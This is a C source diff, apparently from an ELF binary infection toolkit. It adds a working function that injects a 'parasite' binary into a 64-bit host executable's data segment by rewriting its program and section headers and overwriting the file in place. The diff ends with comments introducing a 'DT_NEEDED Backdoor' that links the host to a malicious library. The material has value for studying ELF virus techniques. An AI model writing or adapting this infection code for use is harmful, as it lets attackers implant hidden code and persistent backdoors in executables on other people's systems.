@@ -133,7 +133,6 @@ uint32_t textpadding_inject_32(Elfit_t *host, Elfit_t *parasite, uint32_t patch_
     rename(TMP, host->name);
     close(ofd);
 
-    printf("[+ PARASITE INJECTED AT 0x%08x]\n", text_begin + entry_offset);
     return text_begin + entry_offset; 
 }
 
@@ -428,3 +427,103 @@ uint64_t reverse_inject_64(Elfit_t *host, Elfit_t *parasite)
 
     return textaddr + sizeof(Elf64_Ehdr);
 }
+
+/* DATA SEGMENT INJECTION - a messy implementation that really messes up the section
+ * headers. This will inject successfully, and in all tests the binary will still run,
+ * but this is definitely a work in progress */
+uint64_t data_inject_64(Elfit_t *host, Elfit_t *parasite)
+{
+    Elf64_Ehdr *ehdr;
+    Elf64_Phdr *phdr;
+    Elf64_Shdr *shdr;
+    Elf64_Addr datasegment;
+    off_t parasite_offset; 
+    size_t data_start;
+    size_t psize;
+    int wrote;
+    int ofd;
+    int i;
+
+    psize = parasite->file->st_size;
+
+    ehdr = (Elf64_Ehdr *) host->mem; 
+    phdr = (Elf64_Phdr *) (host->mem + ehdr->e_phoff);
+
+    parasite_offset = 0;
+    for (i=0;i<ehdr->e_phnum;i++, phdr++) 
+    {
+        /* grab the data segment */
+        if (phdr->p_type==PT_LOAD && phdr->p_flags == (PF_R | PF_W))
+        {
+            datasegment = phdr->p_vaddr;
+            data_start = phdr->p_offset;
+            parasite_offset = phdr->p_filesz;
+            phdr->p_filesz += psize;
+            phdr->p_memsz += psize;
+        }
+        if (phdr->p_offset>(data_start + parasite_offset))
+        {
+            phdr->p_offset += psize;
+        }
+    }
+
+    /* modify sections here */
+    shdr = (Elf64_Shdr *) (host->mem + ehdr->e_shoff);
+    for (i=0;i<ehdr->e_shnum;i++, shdr++)
+    {
+        if ((shdr->sh_offset+shdr->sh_size)==(data_start + parasite_offset))
+        { 
+            shdr->sh_size += psize;
+        }
+        if (shdr->sh_offset>(data_start + parasite_offset))
+        {
+            shdr->sh_offset += psize;
+        }
+        if ((shdr->sh_addr)>=(datasegment + parasite_offset))
+        {
+            shdr->sh_addr += psize;
+        }
+    }
+
+    if (ehdr->e_shoff > (data_start + parasite_offset)) 
+    {
+        ehdr->e_shoff += psize;
+    }
+
+
+    /* modify the parasite to be everything up to the parasite injection point */
+    parasite_offset = data_start + parasite_offset;
+    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))<0)
+    {
+        perror("open tmp");
+        exit(1);
+    }
+
+    if ((wrote = write(ofd, host->mem, parasite_offset)) != parasite_offset)
+    {
+        perror("write host");
+        exit(1);
+    }
+
+    if ((wrote = write(ofd, parasite->mem, parasite->file->st_size)) != parasite->file->st_size)
+    {
+        perror("write parasite");
+        exit(1);
+    }
+
+    if ((wrote = write(ofd, host->mem + parasite_offset, host->file->st_size - parasite_offset)) != (host->file->st_size - parasite_offset))
+    {
+        perror("finish host");
+        exit(1);
+    }
+
+
+    rename(TMP, host->name);
+    close(ofd);
+
+    return datasegment + (parasite_offset - data_start);
+}
+
+/* DT_NEEDED Backdoor, creates a dependency to a malicious library */
+/* this is an unusual injection method because it does not return an address */
+/* it will only inject the name of the library */
